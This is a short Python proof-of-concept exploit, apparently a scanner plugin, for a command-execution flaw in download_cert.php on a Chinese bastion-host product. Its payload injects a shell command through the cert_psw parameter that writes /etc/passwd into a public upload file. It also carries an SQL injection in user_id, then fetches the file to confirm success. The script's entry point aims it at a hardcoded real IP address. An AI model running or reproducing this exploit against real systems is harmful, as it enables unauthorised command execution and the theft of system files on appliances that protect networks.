#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  江南科友堡垒机全版本system/download_cert.php页面命令执行
Author    :  a
mail      :  a@lcx.cc
refer     :  wooyun-2014-076864 wooyun-2010-077195
"""
import urlparse

def assign(service, arg):
    if service == 'hac_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload='system/download_cert.php?cert_psw=3|%20cat%20/etc/passwd%20%3E%3E%20/usr/local/apache2/htdocs/project/www/upload/fuck.txt%20|&user_id=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13--%20a&manager=1'
    target = arg + payload
    try:
        code, head, res, errcode, _ = curl.curl2(target)
        shell_path='upload/fuck.txt'
        verify_url=arg+shell_path
        code, head, res, errcode, _ = curl.curl2(verify_url)
        if code==200 and ('root:x' in res) and ('bin:' in res):
            security_hole(target)
    except:
        pass
if __name__ == '__main__': 
    from dummy import *
    audit(assign('hac_gateway','https://123.124.158.72/')[1])